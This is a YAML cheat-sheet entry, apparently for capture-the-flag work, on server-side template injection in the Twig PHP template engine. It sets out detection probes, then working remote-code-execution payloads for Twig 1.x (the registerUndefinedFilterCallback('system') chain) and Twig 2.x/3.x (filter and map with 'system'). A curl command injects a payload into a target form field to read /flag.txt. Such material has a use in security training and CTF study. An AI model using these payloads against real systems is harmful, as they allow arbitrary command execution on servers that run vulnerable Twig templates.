name: twig_ssti
category: web
tags: [ssti, twig, rce, template_injection]
indicators:
  - "Twig template engine"
  - "User input directly passed to render()"
  - "{{}} syntax parsed and executed"

tricks:
  - name: "Step 1: Detect SSTI"
    when: "Found input point"
    how: "Test template expressions"
    payload: |
      {{7*7}}  -> 49
      {{7*'7'}} -> 7777777
      # If returns calculated result, SSTI exists

  - name: "Step 2: Twig 1.x RCE"
    when: "Confirmed Twig SSTI"
    how: "Use _self.env to execute commands"
    payload: |
      # Register system as filter callback
      {{_self.env.registerUndefinedFilterCallback('system')}}
      # Trigger command execution
      {{_self.env.getFilter('cat /flag.txt')}}

  - name: "Step 3: Extract the flag"
    when: "RCE successful"
    how: "Read flag file"
    payload: |
      curl -X POST http://TARGET/index.php \
        -d "name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag.txt')}}"

  - name: "Alternative: Other Twig payloads"
    when: "Need alternative"
    how: "Different version payloads"
    payload: |
      # Twig 1.x
      {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}

      # Twig 2.x/3.x
      {{['id']|filter('system')}}
      {{['cat /flag.txt']|map('system')}}
